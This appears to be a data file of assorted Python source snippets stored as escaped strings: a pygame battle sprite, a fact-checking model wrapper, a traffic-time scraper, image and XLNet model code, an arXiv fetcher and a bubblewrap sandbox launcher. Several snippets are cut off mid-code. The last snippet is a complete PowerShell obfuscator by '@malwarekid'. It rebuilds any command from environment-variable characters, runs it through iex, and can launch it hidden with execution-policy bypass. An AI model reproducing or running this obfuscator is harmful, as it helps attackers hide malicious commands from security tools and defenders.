= lambda: self.set_highlight(False)),\r\n\t\t\t'kill': Timer(600, func = self.destroy)\r\n\t\t}\r\n\r\n\tdef animate(self, dt):\r\n\t\tself.frame_index += ANIMATION_SPEED * dt\r\n\t\tif self.state == 'attack' and self.frame_index >= len(self.frames['attack']):\r\n\t\t\tself.apply_attack(self.target_sprite, self.current_attack, self.monster.get_base_damage(self.current_attack))\r\n\t\t\tself.state = 'idle'\r\n\r\n\t\tself.adjusted_frame_index = int(self.frame_index % len(self.frames[self.state]))\r\n\t\tself.image = self.frames[self.state][self.adjusted_frame_index]\r\n\r\n\t\tif self.highlight:\r\n\t\t\twhite_surf = pygame.mask.from_surface(self.image).to_surface()\r\n\t\t\twhite_surf.set_colorkey('black')\r\n\t\t\tself.image = white_surf\r\n\r\n\tdef set_highlight(self, value):\r\n\t\tself.highlight = value\r\n\t\tif value: \r\n\t\t\tself.timers['remove highlight'].activate()\r\n\r\n\tdef activate_attack(self, target_sprite, attack):\r\n\t\tself.state = 'attack'\r\n\t\tself.frame_index = 0\r\n\t\tself.target_sprite = target_sprite\r\n\t\tself.current_attack = attack\r\n\t\tself.monster.reduce_energy(attack)\r\n\r\n\tdef delayed_kill(self, new_monster):\r\n\t\tif not self.timers['kill'].active:\r\n\t\t\tself.next_monster_data = new_monster\r\n\t\t\tself.timers['kill'].activate()\r\n\r\n\tdef destroy(self):\r\n\t\tif self.next_monster_data:\r\n\t\t\tself.create_monster(*self.next_monster_data)\r\n\t\tself.kill()\r\n\r\n\tdef update(self, dt):\r\n\t\tfor timer in self.timers.values():\r\n\t\t\ttimer.update()\r\n\t\tself.animate(dt)\r\n\t\tself.monster.update(dt)\r\n\r\nclass MonsterOutlineSprite(pygame.sprite.Sprite):\r\n\tdef __init__(self, monster_sprite, groups, frames):\r\n\t\tsuper().__init__(groups)\r\n\t\tself.z = BATTLE_LAYERS['outline']\r\n\t\tself.monster_sprite = monster_sprite\r\n\t\tself.frames = frames\r\n\r\n\t\tself.image = self.frames[self.monster_sprite.state][self.monster_sprite.frame_index]\r\n\t\tself.rect = self.image.get_frect(center = self.monster_sprite.rect.center)\r\n\r\n\tdef update(self, _):\r\n\t\tself.image = self.frames[self.monster_sprite.state][self.monster_sprite.adjusted_frame_index]\r\n\t\tif not self.monster_sprite.groups():\r\n\t\t\tself.kill()\r\n\r\nclass MonsterNameSprite(pygame.sprite.Sprite):\r\n\tdef __init__(self, pos, monster_sprite, groups, font):\r\n\t\tsuper().__init__(groups)\r\n\t\tself.monster_sprite = monster_sprite\r\n\t\tself.z = BATTLE_LAYERS['name']\r\n\r\n\t\ttext_surf = font.render(monster_sprite.monster.name, False, COLORS['black'])\r\n\t\tpadding = 10\r\n\r\n\t\tself.image = pygame.Surface((text_surf.get_width() + 2 * padding, text_surf.get_height() + 2 * padding)) \r\n\t\tself.image.fill(COLORS['white'])\r\n\t\tself.image.blit(text_surf, (padding, padding))\r\n\t\tself.rect = self.i",
    "# Adapt code from https://github.com/yuh-zha/AlignScore/tree/main\n\nimport sys\nsys.path.append(\"..\")\n\nfrom minicheck.inference import Inferencer\nfrom typing import List\nimport numpy as np\n\n\nclass MiniCheck:\n    def __init__(self, model_name='flan-t5', device='cuda:0', chunk_size=None, max_input_length=None, batch_size=16, cache_dir=None) -> None:\n\n        assert model_name in ['roberta-large', 'deberta-v3-large', 'flan-t5-large'], \\\n            \"model_name must be one of ['roberta-large', 'deberta-v3-large', 'flan-t5-large']\"\n\n        self.model = Inferencer(\n            model_name=model_name, \n            batch_size=batch_size, \n            device=device,\n            chunk_size=chunk_size,\n            max_input_length=max_input_length,\n            cache_dir=cache_dir\n        )\n\n    def score(self, docs: List[str], claims: List[str]) -> List[float]:\n        '''\n        pred_labels: 0 / 1 (0: unsupported, 1: supported)\n        max_support_probs: the probability of \"supported\" for the chunk that determin the final pred_label\n        used_chunks: divided chunks of the input document\n        support_prob_per_chunk: the probability of \"supported\" for each chunk\n        '''\n\n        assert isinstance(docs, list) or isinstance(docs, np.ndarray), \"docs must be a list or np.ndarray\"\n        assert isinstance(claims, list) or isinstance(claims, np.ndarray), \"claims must be a list or np.ndarray\"  \n\n        max_support_prob, used_chunk, support_prob_per_chunk = self.model.fact_check(docs, claims)\n        pred_label = [1 if prob > 0.5 else 0 for prob in max_support_prob]\n\n        return pred_label, max_support_prob, used_chunk, support_prob_per_chunk\n    \n\nif __name__ == '__main__':\n\n    model_name = 'flan-t5-large'   # ['roberta-large', 'deberta-v3-large', 'flan-t5-large']\n    scorer = MiniCheck(model_name=model_name, device=f'cuda:0', cache_dir='./ckpts')\n\n    doc = \"A group of students gather in the school library to study for their upcoming final exams.\"\n    claim_1 = \"The students are preparing for an examination.\"\n    claim_2 = \"The students are on vacation.\"\n\n    # model_name can be one of ['roberta-large', 'deberta-v3-large', 'flan-t5-large']\n    # lytang/MiniCheck-Flan-T5-Large will be auto-downloaded from Huggingface for the first time\n    scorer = MiniCheck(model_name='flan-t5-large', device=f'cuda:0', cache_dir='./ckpts')\n    pred_label, raw_prob, _, _ = scorer.score(docs=[doc, doc], claims=[claim_1, claim_2])\n\n    print(pred_label) # [1, 0]\n    print(raw_prob)   # [0.9805923700332642, 0.007121307775378227]",
    "import pandas as pd\nimport json\nfrom datetime import datetime\nimport requests as r\n\nimport matplotlib.pyplot as plt\nimport matplotlib.ticker as tkr\nfrom matplotlib.lines import Line2D\n\nfrom constants import TOKEN_API_GOOGLE, TELEGRAM_CHANNEL_RAYA\nSPACE = '     '\n\n\ndef get_data():\n    BASE_URL = 'https://maps.googleapis.com/maps/api/directions/json'\n    TIME_NOW = f'{datetime.now():%Y-%m-%d-%H-%M}-00'\n\n    df = pd.read_csv('dep/stops.csv')\n\n    for i in range(1,13):\n        tf = df[df['chain'] == i].copy().drop('chain',axis=1)\n        for j in range(len(tf)-1): \n            ROUTE = f\"{tf['route'].iloc[j]}\"\n            ORIGIN = f\"{tf['lat'].iloc[j]}%2C{tf['lon'].iloc[j]}\"\n            DESTINATION = f\"{tf['lat'].iloc[j+1]}%2C{tf['lon'].iloc[j+1]}\"\n\n            URL = f'{BASE_URL}?departure_time=now&origin={ORIGIN}&destination={DESTINATION}&key={TOKEN_API_GOOGLE}'\n\n            data = json.loads(r.get(URL).text)\n            FILE = f'output/json_raya/{ROUTE}_{TIME_NOW}.json'\n            with open(FILE, 'w', encoding='utf8') as f: f.write(json.dumps(data, indent=4, ensure_ascii=False))\n\n    return TIME_NOW\n\n\ndef update_db(TIME_NOW=None):\n    df = pd.read_csv('dep/stops.csv')\n    res = pd.DataFrame(columns=['timestamp','route','duration'])\n\n    for i in range(1,13):\n        tf = df[df['chain'] == i].copy().drop('chain',axis=1)\n        for j in range(len(tf)-1): \n            ROUTE = f\"{tf['route'].iloc[j]}\"\n            try:\n                data = json.load(open(f'output/json_raya/{ROUTE}_{TIME_NOW}.json','r'))\n                DURATION = data['routes'][0]['legs'][0]['duration_in_traffic']['value']\n                res.loc[len(res)] = [TIME_NOW,ROUTE,DURATION]\n            except:\n                res.loc[len(res)] = [TIME_NOW,ROUTE,-1]\n\n    res.timestamp = pd.to_datetime(res.timestamp,format='%Y-%m-%d-%H-%M-%S')\n    N_ISSUES = len(res[res.duration == -1])\n\n    res_old = pd.read_parquet('output/raya.parquet')\n    res = pd.concat([res_old,res],axis=0,ignore_index=True).drop_duplicates(subset=['route','timestamp'],keep='last')\n    res = res.sort_values(['route','timestamp']).reset_index(drop=True)\n    res.to_parquet('output/raya.parquet',index=False,compression='brotli')\n\n    return N_ISSUES\n\n\ndef make_chart():\n    map_chain = {\n        1: 'Johor Bahru <--> Klang Valley',\n        2: 'Johor Bahru <--> Klang Valley', # revertse\n        3: 'Kota Bharu <--> Klang Valley', # revertse\n        4: 'Kota Bharu <--> Klang Valley',\n        5: 'Perlis <--> Klang Valley', # reverse\n        6: 'Perlis <--> Klang Valley'\n    }\n\n    df = pd.read_parquet('output/raya.parquet')\n    rf = pd.read_csv('dep/stops.csv')[['route','chain']]\n    df = pd.merge(df,rf,on=['route'],how='left')\n    df = df[df.chain < 7]\n    df = df[~df.route.str.contains('gerik')].groupby(['timestamp','chain']).sum(numeric_only=True).reset_index()\n\n    df.duration = df.duration / 3600\n    df['route'] = df.chain.map(map_chain)\n    df['direction'] = 'Into KV'\n    df.loc[df.chain.isin([2,3,5]), 'direction'] = 'Out of KV'\n    df = df.pivot(index=['route','timestamp'],columns='direction',values='duration').reset_index().sort_values(by=['route','timestamp']).reset_index(drop=True)\n    LATEST = str(df.timestamp.iloc[-1])\n    df = df.set_index('timestamp')\n\n    plt.rcParams.update({'font.size': 10,\n                        'font.family': 'sans-serif',\n                        'grid.linestyle': 'dashed'})\n    plt.rcParams[\"figure.figsize\"] = [5,11]\n    plt.rcParams[\"figure.autolayout\"] = True\n    fig, ax = plt.subplots(3,1,sharex=False)\n    ax = ax.ravel()\n\n    i = 0\n    for o in ['Johor Bahru','Kota Bharu','Perlis']:\n        df[df.route.str.contains(o)].plot(y='Into KV', ax=ax[i], color='red')\n        df[df.route.str.contains(o)].plot(y='Out of KV', ax=ax[i], color='blue')\n        ax[i].set_title(f\"\"\"\\n{o} <---> Klang Valley\"\"\",linespacing=1.8)\n        i += 1\n\n    for i in [0,1,2]:\n        for b in ['top','right']: ax[i].spines[b].set_visible(False)\n        ax[i].get_yaxis().set_major_formatter(tkr.FuncFormatter(lambda x, p: format(x, ',.1f')))\n        ax[i].yaxis.grid(True)\n        ax[i].set_axisbelow(True)\n        ax[i].set_ylabel('')\n        ax[i].set_xlabel('')\n        ax[i].get_legend().remove()\n\n    line_blue = Line2D([0], [0], label='Out of KV',color='blue')\n    line_red = Line2D([0], [0], label='Into KV',color='red')\n    fig.legend(ncol=2, handles=[line_red,line_blue], bbox_to_anchor=(0.52, 0.93), loc='upper center')\n    plt.suptitle(f'{SPACE}Travel Times across Peninsular (hrs)\\n{SPACE}Last Updated: {LATEST[:-3]}\\n',linespacing=1.8)\n    plt.savefig('output/timeseries_raya.png',dpi=400)\n    plt.close()\n\n\ndef send_update(TIME_NOW=None,N_ISSUES=None,TG=TELEGRAM_CHANNEL_RAYA):\n    EMOJI = '\u2705 \u2705' if N_ISSUES == 0 else '\ud83e\udd72 \ud83e\udd72'\n    message = f'Raya traffic update:\\n{TIME_NOW}\\n\\nCron has run.\\n\\n{EMOJI} {N_ISSUES} record(s) with null values'\n    img_path = 'output/timeseries_raya.png'\n    doc_path = ''\n\n    url = f'https://api.telegram.org/bot{TG[0]}/send'\n\n    param_msg = {'chat_id",
    "import math\nimport torch\nimport torch.nn as nn\nimport torch.utils.checkpoint as checkpoint\n\nfrom basicsr.utils.registry import ARCH_REGISTRY\nfrom basicsr.archs.arch_util import to_2tuple, trunc_normal_\n\nfrom einops import rearrange\n\ndef drop_path(x, drop_prob: float = 0., training: bool = False):\n    \"\"\"Drop paths (Stochastic Depth) per sample (when applied in main path of residual blocks).\n\n    From: https://github.com/rwightman/pytorch-image-models/blob/master/timm/models/layers/drop.py\n    \"\"\"\n    if drop_prob == 0. or not training:\n        return x\n    keep_prob = 1 - drop_prob\n    shape = (x.shape[0], ) + (1, ) * (x.ndim - 1)  # work with diff dim tensors, not just 2D ConvNets\n    random_tensor = keep_prob + torch.rand(shape, dtype=x.dtype, device=x.device)\n    random_tensor.floor_()  # binarize\n    output = x.div(keep_prob) * random_tensor\n    return output\n\n\nclass DropPath(nn.Module):\n    \"\"\"Drop paths (Stochastic Depth) per sample  (when applied in main path of residual blocks).\n\n    From: https://github.com/rwightman/pytorch-image-models/blob/master/timm/models/layers/drop.py\n    \"\"\"\n\n    def __init__(self, drop_prob=None):\n        super(DropPath, self).__init__()\n        self.drop_prob = drop_prob\n\n    def forward(self, x):\n        return drop_path(x, self.drop_prob, self.training)\n\n\nclass ChannelAttention(nn.Module):\n    \"\"\"Channel attention used in RCAN.\n    Args:\n        num_feat (int): Channel number of intermediate features.\n        squeeze_factor (int): Channel squeeze factor. Default: 16.\n    \"\"\"\n\n    def __init__(self, num_feat, squeeze_factor=16):\n        super(ChannelAttention, self).__init__()\n        self.attention = nn.Sequential(\n            nn.AdaptiveAvgPool2d(1),\n            nn.Conv2d(num_feat, num_feat // squeeze_factor, 1, padding=0),\n            nn.ReLU(inplace=True),\n            nn.Conv2d(num_feat // squeeze_factor, num_feat, 1, padding=0),\n            nn.Sigmoid())\n\n    def forward(self, x):\n        y = self.attention(x)\n        return x * y\n\n\nclass CAB(nn.Module):\n\n    def __init__(self, num_feat, compress_ratio=3, squeeze_factor=30):\n        super(CAB, self).__init__()\n\n        self.cab = nn.Sequential(\n            nn.Conv2d(num_feat, num_feat // compress_ratio, 3, 1, 1),\n            nn.GELU(),\n            nn.Conv2d(num_feat // compress_ratio, num_feat, 3, 1, 1),\n            ChannelAttention(num_feat, squeeze_factor)\n            )\n\n    def forward(self, x):\n        return self.cab(x)\n\n\nclass Mlp(nn.Module):\n\n    def __init__(self, in_features, hidden_features=None, out_features=None, act_layer=nn.GELU, drop=0.):\n        super().__init__()\n        out_features = out_features or in_features\n        hidden_features = hidden_features or in_features\n        self.fc1 = nn.Linear(in_features, hidden_features)\n        self.act = act_layer()\n        self.fc2 = nn.Linear(hidden_features, out_features)\n        self.drop = nn.Dropout(drop)\n\n    def forward(self, x):\n        x = self.fc1(x)\n        x = self.act(x)\n        x = self.drop(x)\n        x = self.fc2(x)\n        x = self.drop(x)\n        return x\n\n\ndef window_partition(x, window_size):\n    \"\"\"\n    Args:\n        x: (B, H, W, C)\n        window_size (int): window size\n    Returns:\n        windows: (num_windows*B, window_size, window_size, C)\n    \"\"\"\n    B, H, W, C = x.shape\n    x = x.view(B, H // window_size, window_size, W // window_size, window_size, C)\n    windows = x.permute(0, 1, 3, 2, 4, 5).contiguous().view(-1, window_size, window_size, C)\n    return windows\n\n\ndef window_reverse(windows, window_size, H, W):\n    \"\"\"\n    Args:\n        windows: (num_windows*B, window_size, window_size, C)\n        window_size (int): Window size\n        H (int): Height of image\n        W (int): Width of image\n    Returns:\n        x: (B, H, W, C)\n    \"\"\"\n    B = int(windows.shape[0] / (H * W / window_size / window_size))\n    x = windows.view(B, H // window_size, W // window_size, window_size, window_size, -1)\n    x = x.permute(0, 1, 3, 2, 4, 5).contiguous().view(B, H, W, -1)\n    return x\n\n\nclass WindowAttention(nn.Module):\n    r\"\"\" Window based multi-head self attention (W-MSA) module with relative position bias.\n    It supports both of shifted and non-shifted window.\n    Args:\n        dim (int): Number of input channels.\n        window_size (tuple[int]): The height and width of the window.\n        num_heads (int): Number of attention heads.\n        qkv_bias (bool, optional):  If True, add a learnable bias to query, key, value. Default: True\n        qk_scale (float | None, optional): Override default qk scale of head_dim ** -0.5 if set\n        attn_drop (float, optional): Dropout ratio of attention weight. Default: 0.0\n        proj_drop (float, optional): Dropout ratio of output. Default: 0.0\n    \"\"\"\n\n    def __init__(self, dim, window_size, num_heads, qkv_bias=True, qk_scale=None, attn_drop=0., proj_drop=0.):\n\n        super().__init__()\n        self.dim = dim\n        self.window_size = window_size  # Wh, Ww\n        self.num_heads = num_heads\n     ",
    "import feedparser\nimport re\n\ndef get_arxiv_title(arxiv_id):\n    # Construct the URL for the arXiv API query\n    url = f'http://export.arxiv.org/api/query?id_list={arxiv_id}'\n    \n    # Fetch the feed data from arXiv\n    feed = feedparser.parse(url)\n    \n    # Check if the feed entries exist\n    if feed.entries:\n        # Extract the title of the first entry (paper)\n        title = feed.entries[0].title\n        \n        # Clean up the title by removing newlines and extra spaces\n        title = ' '.join(title.split())\n        \n        return title\n    else:\n        return None\n\nif __name__ == '__main__':\n    file = 'arxiv_info.txt'\n    pattern = r'\\b\\d{4}\\.\\d{4,}?\\b' # arxiv ID\n    try:\n        with open(file, 'r') as f:\n            line = f.readline()\n            arxiv_id = re.findall(pattern, line)[0]\n    except:\n        arxiv_id = '2307.01849'\n    \n    title = get_arxiv_title(arxiv_id)\n    arxiv_link = f'https://arxiv.org/abs/{arxiv_id}'\n    \n    result = f\"\"\"{arxiv_id}\n    \n{title}[{arxiv_id}]\n\n\u8bba\u6587\u9898\u76ee\uff1a{title}\n\u8bba\u6587\u5730\u5740\uff1a{arxiv_link}\n\n{title}\\t{arxiv_link}\"\"\"\n    \n    print(result)\n    with open(file, 'w', encoding='utf8') as f:\n        f.write(result)\n",
    "import sys, os, glob, random, string, subprocess\nfrom pprint import pprint\n\nHOME = os.environ[\"HOME\"]\nXDG_RUNTIME_DIR = os.environ[\"XDG_RUNTIME_DIR\"]\nBUBBLEBOX_DIR = XDG_RUNTIME_DIR + \"/bubblebox\"\nos.makedirs(BUBBLEBOX_DIR, exist_ok=True)\n\ndef randname():\n    # choose from all lowercase letter\n    letters = string.ascii_lowercase\n    return ''.join(random.choice(letters) for i in range(8))\n\nclass BwrapInvocation:\n    \"\"\"Gathered information for a bwrap invocation.\n    This will be created empty, and then each directive's `setup` function is called\n    with this object, so they can accumulate the bwrap flags and any other relevant state.\"\"\"\n    def __init__(self):\n        # The flags to pass to bwrap.\n        self.flags = []\n        # Functions to call at the end of the setup process.\n        # They will receive this object as argument, so they can add further flags.\n        self.finalizers = []\n        # If this is `None` it means so far no d-bus proxy has been set up.\n        self.dbus_proxy_flags = None\n\nclass BwrapDirective:\n    \"\"\"Directive that just passes flags to bwrap.\"\"\"\n    def __init__(self, bwrap_flags):\n        self.bwrap_flags = bwrap_flags\n    def setup(self, bwrap):\n        bwrap.flags.extend(self.bwrap_flags)\n\nclass GroupDirective:\n    \"\"\"Directive that groups a bunch of directives to be treated as one.\"\"\"\n    def __init__(self, directives):\n        self.directives = directives\n    def setup(self, bwrap):\n        for directive in self.directives:\n            directive.setup(bwrap)\n\nclass DbusProxyDirective:\n    \"\"\"Directive that sets up a d-bus proxy and adds flags to it.\n    If the directive is used multiple times, the flags accumulate.\"\"\"\n    def __init__(self, dbus_proxy_flags):\n        self.dbus_proxy_flags = dbus_proxy_flags\n    def setup(self, bwrap):\n        if bwrap.dbus_proxy_flags is None:\n            # We are the first d-bus proxy directive. Set up the flags and the finalizer.\n            bwrap.dbus_proxy_flags = []\n            bwrap.finalizers.append(DbusProxyDirective.launch_dbus_proxy)\n        # Always add the flags.\n        bwrap.dbus_proxy_flags.extend(self.dbus_proxy_flags)\n    def launch_dbus_proxy(bwrap):\n        \"\"\"Finalizer that launches a d-bus proxy with the flags accumulated in `bwrap`.\"\"\"\n        # For the system bus, we assume it to be at a fixed location and provide it to the sandbox at that same location.\n        # For the session bus, we tell the proxy to talk to DBUS_SESSION_BUS_ADDRESS on the host, but we always put it\n        # at `$XDG_RUNTIME_DIR/bus` in the sandbox.\n        session_bus = XDG_RUNTIME_DIR + \"/bus\" # how the sandbox will see the bus\n        system_bus = \"/run/dbus/system_bus_socket\"\n        session_bus_proxy = BUBBLEBOX_DIR + \"/bus-\" + randname()\n        system_bus_proxy = BUBBLEBOX_DIR + \"/bus-system-\" + randname()\n        # Prepare a pipe to coordinate shutdown of bwrap and the proxy\n        bwrap_end, other_end = os.pipe() # both FDs are \"non-inheritable\" now\n        # Invoke the debus-proxy\n        args = [\"/usr/bin/xdg-dbus-proxy\", \"--fd=\"+str(other_end)]\n        args += [\"unix:path=\"+system_bus, system_bus_proxy, \"--filter\"] # just block everything for the system bus\n        args += [os.environ[\"DBUS_SESSION_BUS_ADDRESS\"], session_bus_proxy, \"--filter\"] + bwrap.dbus_proxy_flags\n        #pprint(args)\n        subprocess.Popen(\n            args,\n            pass_fds = [other_end], # default is to pass only the std FDs!\n        )\n        # Wait until the proxy is ready\n        os.read(bwrap_end, 1)\n        assert os.path.exists(session_bus_proxy)\n        # Make sure bwrap can access the other end of the pipe\n        os.set_inheritable(bwrap_end, True)\n        # Put this at the usual location for the bus insode the sandbox.\n        # TODO: What if DBUS_SESSION_BUS_ADDRESS says something else?\n        bwrap.flags.extend((\n            \"--setenv\", \"DBUS_SESSION_BUS_ADDRESS\", \"unix:path=\"+session_bus,\n            \"--bind\", session_bus_proxy, session_bus,\n            \"--bind\", system_bus_proxy, system_bus,\n            \"--sync-fd\", str(bwrap_end),\n        ))\n\n# Constructors that should be used instead of directly mentioning the class above.\ndef bwrap_flags(*flags):\n    return BwrapDirective(flags)\ndef dbus_proxy_flags(*flags):\n    return DbusProxyDirective(flags)\ndef group(*directives):\n    return GroupDirective(directives)\n\n# Run the application in the bubblebox with the given flags.\ndef bubblebox(*directives):\n    if len(sys.argv) <= 1:\n        print(f\"USAGE: {sys.argv[0]} <program name> <program arguments>\")\n        sys.exit(1)\n    # Make sure `--die-with-parent` is always set.\n    directives = group(bwrap_flags(\"--die-with-parent\"), *directives)\n    # Compute the bwrap invocation by running all the directives.\n    bwrap = BwrapInvocation()\n    directives.setup(bwrap)\n    for finalizer in bwrap.finalizers:\n        finalizer(bwrap)\n    # Run bwrap\n    args = [\"/usr/bin/bwrap\"] + bwrap.flags + [\"--\"] + sys.argv[1:]\n    #pprint(args)\n    os.execvp",
    "import math\nfrom typing import Union, Tuple\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom transformers.models.xlnet.modeling_xlnet import XLNetPreTrainedModel\nfrom transformers.models.xlnet.modeling_xlnet import (\n    XLNetLayer,\n    SequenceSummary,\n)\n\n\nclass XLNetModel(XLNetPreTrainedModel):\n    def resize_position_embeddings(self, new_num_position_embeddings: int):\n        pass\n\n    def get_position_embeddings(self) -> Union[nn.Embedding, Tuple[nn.Embedding]]:\n        pass\n\n    def prepare_inputs_for_generation(self, *args, **kwargs):\n        pass\n\n    def _reorder_cache(self, past_key_values, beam_idx):\n        pass\n\n    def __init__(self, config):\n        super().__init__(config)\n\n        self.mem_len = config.mem_len\n        self.reuse_len = config.reuse_len\n        self.d_model = config.d_model\n        self.same_length = config.same_length\n        self.attn_type = config.attn_type\n        self.bi_data = config.bi_data\n        self.clamp_len = config.clamp_len\n        self.n_layer = config.n_layer\n\n        self.word_embedding = nn.Embedding(config.vocab_size, config.d_model)\n        self.mask_emb = nn.Parameter(torch.FloatTensor(1, 1, config.d_model))\n        self.layer = nn.ModuleList([XLNetLayer(config) for _ in range(config.n_layer)])\n        self.dropout = nn.Dropout(config.dropout)\n\n        self.init_weights()\n\n    def get_input_embeddings(self):\n        return self.word_embedding\n\n    def set_input_embeddings(self, new_embeddings):\n        self.word_embedding = new_embeddings\n\n    def _prune_heads(self, heads_to_prune):\n        raise NotImplementedError\n\n    def create_mask(self, qlen, mlen):\n        attn_mask = torch.ones([qlen, qlen])\n        mask_up = torch.triu(attn_mask, diagonal=1)\n        attn_mask_pad = torch.zeros([qlen, mlen])\n        ret = torch.cat([attn_mask_pad, mask_up], dim=1)\n        if self.same_length:\n            mask_lo = torch.tril(attn_mask, diagonal=-1)\n            ret = torch.cat([ret[:, :qlen] + mask_lo, ret[:, qlen:]], dim=1)\n\n        ret = ret.to(self.device)\n        return ret\n\n    def cache_mem(self, curr_out, prev_mem):\n        if self.reuse_len is not None and self.reuse_len > 0:\n            curr_out = curr_out[: self.reuse_len]\n        if prev_mem is None:\n            new_mem = curr_out[-self.mem_len:]\n        else:\n            new_mem = torch.cat([prev_mem, curr_out], dim=0)[-self.mem_len:]\n        return new_mem.detach()\n\n    @staticmethod\n    def positional_embedding(pos_seq, inv_freq, bsz=None):\n        sinusoid_inp = torch.einsum(\"i,d->id\", pos_seq, inv_freq)\n        pos_emb = torch.cat(\n            [torch.sin(sinusoid_inp), torch.cos(sinusoid_inp)], dim=-1)\n        pos_emb = pos_emb[:, None, :]\n        if bsz is not None:\n            pos_emb = pos_emb.expand(-1, bsz, -1)\n        return pos_emb\n\n    def relative_positional_encoding(self, qlen, klen, bsz=None):\n        freq_seq = torch.arange(0, self.d_model, 2.0, dtype=torch.float)\n        inv_freq = 1 / torch.pow(10000, (freq_seq / self.d_model))\n        if self.attn_type == \"bi\":\n            beg, end = klen, -qlen\n        elif self.attn_type == \"uni\":\n            beg, end = klen, -1\n        else:\n            raise ValueError(\"Unknown `attn_type` {}.\".format(self.attn_type))\n\n        if self.bi_data:\n            fwd_pos_seq = torch.arange(beg, end, -1.0, dtype=torch.float)\n            bwd_pos_seq = torch.arange(-beg, -end, 1.0, dtype=torch.float)\n            if self.clamp_len > 0:\n                fwd_pos_seq = fwd_pos_seq.clamp(-self.clamp_len, self.clamp_len)\n                bwd_pos_seq = bwd_pos_seq.clamp(-self.clamp_len, self.clamp_len)\n            if bsz is not None:\n                fwd_pos_emb = self.positional_embedding(fwd_pos_seq, inv_freq, bsz // 2)\n                bwd_pos_emb = self.positional_embedding(bwd_pos_seq, inv_freq, bsz // 2)\n            else:\n                fwd_pos_emb = self.positional_embedding(fwd_pos_seq, inv_freq)\n                bwd_pos_emb = self.positional_embedding(bwd_pos_seq, inv_freq)\n            pos_emb = torch.cat([fwd_pos_emb, bwd_pos_emb], dim=1)\n        else:\n            fwd_pos_seq = torch.arange(beg, end, -1.0)\n            if self.clamp_len > 0:\n                fwd_pos_seq = fwd_pos_seq.clamp(-self.clamp_len, self.clamp_len)\n            pos_emb = self.positional_embedding(fwd_pos_seq, inv_freq, bsz)\n        pos_emb = pos_emb.to(self.device)\n        return pos_emb\n\n    def forward(self, input_ids, attention_mask=None, mems=None, perm_mask=None, target_mapping=None,\n                token_type_ids=None, input_mask=None, head_mask=None, inputs_embeds=None, use_cache=True,\n                output_attentions=None, output_hidden_states=None):\n        output_attentions = (\n            output_attentions\n            if output_attentions is not None\n            else self.config.output_attentions\n        )\n        output_hidden_states = (\n            output_hidden_states\n            if output_hidden_states is not None\n            else self.config.output_",
    "import os\nimport base64\nimport random\nfrom typing import Dict, List\n\ndef rh(prompt: str) -> str:\n    return input(prompt)\n\ndef rfc(path: str) -> str:\n    with open(path, \"r\") as file:\n        return file.read()\n\ndef gem(ev: List[str]) -> Dict[str, Dict[str, List[int]]]:\n    em = {}\n    for var in ev:\n        value = os.environ.get(var, \"\")\n        if value:\n            for char in value:\n                if char not in em:\n                    em[char] = {}\n                if var not in em[char]:\n                    em[char][var] = []\n                em[char][var].append(value.index(char))\n    return em\n\ndef eo(string: str, em: Dict[str, Dict[str, List[int]]]) -> List[str]:\n    obf_code = []\n    for char in string:\n        options = em.get(char)\n        if not options:\n            obf_code.append(f\"[char]{ord(char)}\")\n            continue\n        chosen = random.choice(list(options.keys()))\n        possible_indices = options[chosen]\n        chosen_index = random.choice(possible_indices)\n        new_char = os.environ[chosen][chosen_index]\n        pwsh_syntax = f\"$env:{chosen}[{chosen_index}]\"\n        obf_code.append(pwsh_syntax)\n    return obf_code\n\ndef po(string: str, em: Dict[str, Dict[str, List[int]]]) -> str:\n    iex = eo(\"iex\", em)\n    pieces = eo(string, em)\n    iex_stage = \"($( {} ) -Join $($null))\".format(\",\".join(iex))\n    payload_stage = \"($( {} ) -Join $($null))\".format(\",\".join(pieces))\n    return \"& {} {}\".format(iex_stage, payload_stage)\n\ndef main():\n\n    print(\"\\033[38;2;255;69;172m\" + r'''\n    ____ _       _______ __  __      ______                 ______          \n   / __ \\ |     / / ___// / / /     / ____/___ _   __      / ____/___  _____\n  / /_/ / | /| / /\\__ \\/ /_/ /_____/ __/ / __ \\ | / /_____/ __/ / __ \\/ ___/\n / ____/| |/ |/ /___/ / __  /_____/ /___/ / / / |/ /_____/ /___/ / / / /__  \n/_/     |__/|__//____/_/ /_/     /_____/_/ /_/|___/     /_____/_/ /_/\\___/  \n                                                             By @malwarekid\n''' + \"\\033[0m\"\"\\033[32m\")\n\n    powershell_cmd = rh(\"Powershell command (leave empty for SCRIPT file) : \")\n\n    if not powershell_cmd:\n        pf = rh(\"Script Path : \")\n        powershell_cmd = rfc(pf)\n\n    cpe = rh(\"Pre encode the command? (helpful if your command has ' or \\\" or $ characters) [y/n]\")\n    out_to_file = rh(\"Wants to save the file? [y/n]\" + \"\\033[0m\")\n\n    ev = [\n        \"ALLUSERSPROFILE\",\n        \"CommonProgramFiles\",\n        \"CommonProgramW6432\",\n        \"ComSpec\",\n        \"PATHEXT\",\n        \"ProgramData\",\n        \"ProgramFiles\",\n        \"ProgramW6432\",\n        \"PSModulePath\",\n        \"PUBLIC\",\n        \"SystemDrive\",\n        \"SystemRoot\",\n        \"windir\"\n    ]\n\n    em = gem(ev)\n\n    if cpe.lower() == 'y':\n        print(\"Original Command\\n================================\\n{}\\n================================\".format(powershell_cmd))\n        to_encode = powershell_cmd\n        encoded_command = base64.b64encode(to_encode.encode(\"utf-16le\")).decode()\n        full_command = f\"Start-Process PowerShell.exe -ArgumentList ('-ep bypass -w h -e {encoded_command}')\"\n        print(\"Encoded Command\\n================================\\n{}\\n================================\".format(full_command))\n        encoded = po(full_command, em)\n    else:\n        print(\"Original Command\\n================================\\n{}\\n================================\".format(powershell_cmd))\n        encoded = po(powershell_cmd, em)\n\n    print(\"\\033[31m\" + r\"FINAL Encoded Command\"+ \"\\033[0m\"\"\\n================================\\n{}\\n================================\".format(encoded))\n\n    if out_to_file.lower() == 'y':\n        with open('encoded.ps1', 'w') as file:\n            file.write(encoded)\n        print(\"================================\\nFile saved to 'encoded.ps1'\\n================================\")\n\nif __name__ == \"__main__\":\n    main()\n",
